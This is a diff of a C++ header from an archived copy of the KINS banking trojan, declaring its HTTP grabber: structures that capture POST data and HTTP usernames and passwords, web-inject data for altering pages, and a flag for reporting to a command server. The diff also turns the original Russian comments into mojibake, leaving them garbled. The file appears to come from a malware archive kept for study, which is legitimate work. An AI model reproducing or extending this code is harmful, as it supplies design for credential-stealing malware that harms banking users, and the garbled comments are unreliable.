@@ -1,5 +1,16 @@
 /*
-  Общии функции для граббинга HTTP.
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
+/*
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTP.
 */
 #pragma once
 
@@ -8,70 +19,70 @@
 
 namespace HttpGrabber
 {
-  //Различные константы.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   enum
   {
     MAX_POSTDATA_SIZE = 1 * 1024 * 1024
   };
   
-  //Тип запроса.
+  //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   enum
   {
     VERB_GET,  //GET
     VERB_POST  //POST
   };
 
-  //Данные инжейте, фейки.
+  //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ.
   typedef struct
   {
-    DWORD flags;                      //Флаги HttpInject::FLAG_*.
-    LPSTR urlMask;                    //Маска URL.
-    LPSTR contextMask;                //Белая маска контента.
-    HttpInject::INJECTBLOCK *injects; //Данные инжекта. Уже проверенные на ошибки.
-    DWORD injectsSize;                //Размер injects в байтах.
+    DWORD flags;                      //пїЅпїЅпїЅпїЅпїЅ HttpInject::FLAG_*.
+    LPSTR urlMask;                    //пїЅпїЅпїЅпїЅпїЅ URL.
+    LPSTR contextMask;                //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+    HttpInject::INJECTBLOCK *injects; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+    DWORD injectsSize;                //пїЅпїЅпїЅпїЅпїЅпїЅ injects пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   }INJECTFULLDATA;
 
-  //Флаги запроса.
+  //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   enum
   {
-    RDF_WININET = 0x1, //Запрос пришел от wininet.
-    RDF_NSPR4   = 0x2, //Запрос пришел от NSPR4.
+    RDF_WININET = 0x1, //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ wininet.
+    RDF_NSPR4   = 0x2, //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ NSPR4.
   };
 
-  //Данные запроса.
+  //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   typedef struct
   {    
     /*
-      Флаги.
+      пїЅпїЅпїЅпїЅпїЅ.
     */
     DWORD flags;
     
     /*
-      IN Некий хэндл запроса (зависит от перехватываемой библиотеки).
+      IN пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ).
     */
     void *handle;
     
     /*
-      IN URL. Выделяется через Mem.
+      IN URL. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Mem.
       
-      Освобождается через _freeRequestData().
+      пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ _freeRequestData().
     */
     LPSTR url;
 
     /*
-      IN Кол. байт в URL, исключая нулевеой байт.
+      IN пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅ URL, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
     */
     DWORD urlSize;
 
     /*
-      IN Реферер.
+      IN пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       
-      Освобождается через _freeRequestData().
+      пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ _freeRequestData().
     */
     LPSTR referer;
 
     /*
-      IN Кол. байт в реферерере, исключая нулевеой байт.
+      IN пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
     */
     DWORD refererSize;
 
@@ -81,69 +92,69 @@ namespace HttpGrabber
     BYTE verb;
 
     /*
-      IN Тип контента, т.е. тип POST-данных.
+      IN пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ.пїЅ. пїЅпїЅпїЅ POST-пїЅпїЅпїЅпїЅпїЅпїЅ.
       
-      Освобождается через _freeRequestData().
+      пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ _freeRequestData().
     */
     LPSTR contentType;
 
     /*
-      IN Размер contentTypeSize.
+      IN пїЅпїЅпїЅпїЅпїЅпїЅ contentTypeSize.
     */
     DWORD contentTypeSize;
 
     /*
-      IN OUT POST-данные (могут не кончатсья на 0). Если возращен флаг
-      ANALIZEFLAG_POSTDATA_REPLACED,данные будут подменены на новые данные, которые нужно
-      освободить через Mem после отправки запроса.
+      IN OUT POST-пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ 0). пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+      ANALIZEFLAG_POSTDATA_REPLACED,пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+      пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Mem пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     */
     void *postData;
 
     /*
-      IN OUT Размер postData. Значение не должно превыщать MAX_POSTDATA_SIZE.
+      IN OUT пїЅпїЅпїЅпїЅпїЅпїЅ postData. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ MAX_POSTDATA_SIZE.
     */
     DWORD postDataSize;
 	
     /*
-      IN Данные HTTP-авторизации.
+      IN пїЅпїЅпїЅпїЅпїЅпїЅ HTTP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     */
     struct 
     {
-      LPWSTR userName;   //Имя пользователя.
-      LPWSTR password;   //Пароль.
-      LPSTR unknownType; //Заполняется оригинальной строкой в случаи неизвестного типа авторизации.
+      LPWSTR userName;   //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+      LPWSTR password;   //пїЅпїЅпїЅпїЅпїЅпїЅ.
+      LPSTR unknownType; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     }authorizationData;
 	
     /*
-      OUT Список инжектов, актуально только при ANALIZEFLAG_URL_INJECT. 
+      OUT пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ ANALIZEFLAG_URL_INJECT. 
 
-      Освобождается через _freeInjectFullDataList().
+      пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ _freeInjectFullDataList().
     */
     INJECTFULLDATA *injects;
 
     /*
-      OUT Размер массива injectData.
+      OUT пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ injectData.
     */
     DWORD injectsCount;
 
     /*
-      IN Текущая конфигурация. NULL, если не сущетвует. Данная конфигурация доступна только для
-      чтения.
+      IN пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. NULL, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+      пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-      Освобождается через _freeRequestData().
+      пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ _freeRequestData().
     */
     BinStorage::STORAGE *currentConfig;
 
   }REQUESTDATA;
 
-  //Флаги для analizeRequestData().
+  //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ analizeRequestData().
   enum
   {
     
-    ANALIZEFLAG_URL_INJECT          = 0x02, //Действие. Получены данные на инжейт/фейк.
-    ANALIZEFLAG_SAVED_REPORT        = 0x08, //Информация. Запрос сохранен в отчет.
+    ANALIZEFLAG_URL_INJECT          = 0x02, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ/пїЅпїЅпїЅпїЅ.
+    ANALIZEFLAG_SAVED_REPORT        = 0x08, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
     ANALIZEFLAG_POSTDATA_URLENCODED = 0x10, //Post request is encoded "application/x-www-form-urlencoded".
-    ANALIZEFLAG_AUTHORIZATION       = 0x20, //Присутвуют данные HTTP-авторизации.	
+    ANALIZEFLAG_AUTHORIZATION       = 0x20, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ HTTP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.	
     ANALIZEFLAG_URL_CAPTCHA         = 0x40, //Request matched capcha entry.
 
     ANALIZEFLAG_NOTIFY_CC           = 0x80, //Request matched URL that we need to report to our server.
@@ -151,107 +162,107 @@ namespace HttpGrabber
   };
 
   /*
-    Инициализация.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   void init(void);
 
   /*
-    Деинициализация.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   void uninit(void);
   
   
   /*
-    Надстройка над Str::matchA() для URL.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ Str::matchA() пїЅпїЅпїЅ URL.
 
-    IN mask     - маска.
+    IN mask     - пїЅпїЅпїЅпїЅпїЅ.
     IN url      - URL.
-    IN urlSize  - размер URL.
-    IN advFlags - дополнительные флаги Str::MATCH_*.
+    IN urlSize  - пїЅпїЅпїЅпїЅпїЅпїЅ URL.
+    IN advFlags - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Str::MATCH_*.
 
-    Return - true  - совпадение найдено,
-             false - совпадение не найдено.
+    Return - true  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+             false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   bool _matchUrlA(const LPSTR mask, const LPSTR url, DWORD urlSize, DWORD advFlags);
 
   /*
-    Надстройка над Str::matchA() для POST-данных.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ Str::matchA() пїЅпїЅпїЅ POST-пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-    IN mask         - маска.
-    IN postData     - POST-данные.
-    IN postDataSize - размер POST-данных.
+    IN mask         - пїЅпїЅпїЅпїЅпїЅ.
+    IN postData     - POST-пїЅпїЅпїЅпїЅпїЅпїЅ.
+    IN postDataSize - пїЅпїЅпїЅпїЅпїЅпїЅ POST-пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-    Return          - true  - совпадение найдено,
-                      false - совпадение не найдено.
+    Return          - true  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                      false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   bool _matchPostDataA(const LPSTR mask, const LPSTR postData, DWORD postDataSize);
   
   /*
-    Надстройка над Str::matchA() для текстового содержимого.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ Str::matchA() пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-    IN mask        - маска.
-    IN context     - содержимое.
-    IN contextSize - размер содержимого.
-    IN advFlags    - дополнительные флаги Str::MATCH_*.
+    IN mask        - пїЅпїЅпїЅпїЅпїЅ.
+    IN context     - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+    IN contextSize - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+    IN advFlags    - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Str::MATCH_*.
 
-    Return         - true  - совпадение найдено,
-                     false - совпадение не найдено.
+    Return         - true  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                     false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   bool _matchContextA(const LPSTR mask, const void *context, DWORD contextSize, DWORD advFlags);
 
   /*
-    Надстройка над Str::matchA() для текстового содержимого.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ Str::matchA() пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-    IN mask         - маска.
-    IN maskSize     - размер маски.
-    IN context      - содержимое.
-    IN contextSize  - размер содержимого.
-    OUT offsetBegin - оффсет начала действия маски в context. Может быть NULL.
-    OUT offsetEnd   - оффсет конца действия маски в context. Может быть NULL.
-    IN advFlags     - дополнительные флаги Str::MATCH_*.
+    IN mask         - пїЅпїЅпїЅпїЅпїЅ.
+    IN maskSize     - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+    IN context      - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+    IN contextSize  - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+    OUT offsetBegin - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ context. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ NULL.
+    OUT offsetEnd   - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ context. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ NULL.
+    IN advFlags     - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Str::MATCH_*.
 
-    Return          - true  - совпадение найдено,
-                      false - совпадение не найдено.
+    Return          - true  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                      false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   bool _matchContextExA(const void *mask, DWORD maskSize, const void *context, DWORD contextSize, LPDWORD offsetBegin, LPDWORD offsetEnd, DWORD advFlags);
 
   /*
-    Добавление элемента в список URL.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ URL.
 
-    IN listId          - тип списка LocalConfig::ITEM_URLLIST_*.
-    IN OUT localConfig - локальная конфигурация.
-    IN urlMask         - маска URL.
+    IN listId          - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ LocalConfig::ITEM_URLLIST_*.
+    IN OUT localConfig - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+    IN urlMask         - пїЅпїЅпїЅпїЅпїЅ URL.
 
-    Return             - true - в случаи успеха,
-                         false - в случаи ошибки.
+    Return             - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                         false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
   */
   bool _addUrlMaskToList(DWORD listId, BinStorage::STORAGE **localConfig, const LPSTR urlMask);
   
   /*
-    Удаление элемента из список URL.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ URL.
 
-    IN listId          - тип списка LocalConfig::ITEM_URLLIST_*.
-    IN OUT localConfig - локальная конфигурация.
-    IN maskOfurlMask   - маска маски URL.
+    IN listId          - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ LocalConfig::ITEM_URLLIST_*.
+    IN OUT localConfig - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+    IN maskOfurlMask   - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ URL.
 
-    Return             - true - в случаи успеха,
-                         false - в случаи ошибки.
+    Return             - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                         false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
   */
   bool _removeUrlMaskFromList(DWORD listId, BinStorage::STORAGE **localConfig, const LPSTR maskOfurlMask);
   
   /*
-    Проверка находиться ли URL в списке.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ URL пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-    IN listId      - тип списка LocalConfig::ITEM_URLLIST_*.
-    IN localConfig - локальная конфигурация.
+    IN listId      - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ LocalConfig::ITEM_URLLIST_*.
+    IN localConfig - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     IN url         - URL.
-    IN urlSize     - размер URL.
-    IN advFlags    - дополнительные флаги Str::MATCH_*.
+    IN urlSize     - пїЅпїЅпїЅпїЅпїЅпїЅ URL.
+    IN advFlags    - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Str::MATCH_*.
 
-    Return         - true - URL найдена,
-                     false - URL не найдена.
+    Return         - true - URL пїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                     false - URL пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   bool _isUrlInList(DWORD listId, const BinStorage::STORAGE *localConfig, const LPSTR url, DWORD urlSize, DWORD advFlags);
   
@@ -261,47 +272,47 @@ namespace HttpGrabber
   DWORD _getLastTimeBlockValue();
 
   /*
-    Анализ URL, и установка соответвующих задач для нее.
+    пїЅпїЅпїЅпїЅпїЅпїЅ URL, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ.
 
-    IN OUT requestData - данные запроса.
+    IN OUT requestData - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     
     Return             - ANALIZEFLAG_*.
   */
   DWORD analizeRequestData(REQUESTDATA *requestData);
 
   /*
-    Исполнение инжектов в контексте.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
     IN url             - URL.
-    IN OUT context     - контекст для изменения.
-    IN OUT contextSize - размер контекста.
-    IN dataList        - список инжектов.
-    IN count           - кол. инжектов.
+    IN OUT context     - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+    IN OUT contextSize - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+    IN dataList        - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+    IN count           - пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-    Return             - true - в конекст были внесены изменения,
-                         false - изменения не были внесены (не означает ошибку).
+    Return             - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                         false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ).
   */
   bool _executeInjects(const LPSTR url, LPBYTE *context, LPDWORD contextSize, const INJECTFULLDATA *dataList, DWORD count);
   
   /*
-    Освобождение всех данных REQUESTDATA выделеяемых через Mem.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ REQUESTDATA пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Mem.
 
-    IN OUT requestData - структура.
+    IN OUT requestData - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   void _freeRequestData(REQUESTDATA *requestData);
 
   /*
-    Освобождение всех данных INJECTFULLDATA выделеяемых через Mem.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ INJECTFULLDATA пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Mem.
 
-    IN OUT data - структура.
+    IN OUT data - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   void _freeInjectFullData(INJECTFULLDATA *data);
 
   /*
-    Освобождение всего массива INJECTFULLDATA.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ INJECTFULLDATA.
 
-    IN dataList - массив.
-    IN count    - размер массива.
+    IN dataList - пїЅпїЅпїЅпїЅпїЅпїЅ.
+    IN count    - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   void _freeInjectFullDataList(INJECTFULLDATA *dataList, DWORD count);
 
